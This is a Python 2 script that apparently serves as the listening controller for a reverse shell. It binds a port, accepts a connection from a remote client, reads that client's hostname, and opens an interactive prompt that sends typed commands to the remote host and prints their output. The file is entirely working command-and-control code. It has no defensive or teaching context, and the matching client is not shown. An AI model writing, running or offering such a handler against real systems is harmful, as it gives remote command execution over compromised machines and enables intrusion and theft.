#server script
import socket, os, sys, time
def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = raw_input('Type the port for listening: ')
        if port == '':
            socketCreate()
        port = int(port)
        #port = 5555
    except socket.error as msg:
        print ('Socket creation error: ' + str(msg[0]))
def socketBind():
    try:
        print ('Binding socket at port %s'%(port))
        #s.bind will bind socket to the designated port
        s.bind((host,port))
        #s.listen will stand for maximum number of connections
        s.listen(1)
    except socket.error as msg:
        print ('Socket binding error: ' + str(msg[0]))
        print ('Retrying...')
        time.sleep(30)
        #in case of exceptions, it'll retry untill binding is successful.
        socketBind()
def socketAccept():
    global conn
    global addr
    global hostname
    try:
        conn, addr = s.accept()
        print ('[!] Session opened at %s:%s'%(addr[0],addr[1]))
        print ('\n')
        #will assign variable hostname to the hostname of remote client
        hostname = conn.recv(1024)
        menu()
    except socket.error as msg:
        print ('Socket Accepting error: ' + str(msg[0]))
def menu():
    while 1:
        cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ')
        if cmd == 'quit':
            conn.send(cmd)
            conn.close()
            s.close()
            sys.exit()
        print (cmd)
        conn.send(cmd)
        print(conn.recv(16834))

def main():
    socketCreate()
    socketBind()
    socketAccept()

main()


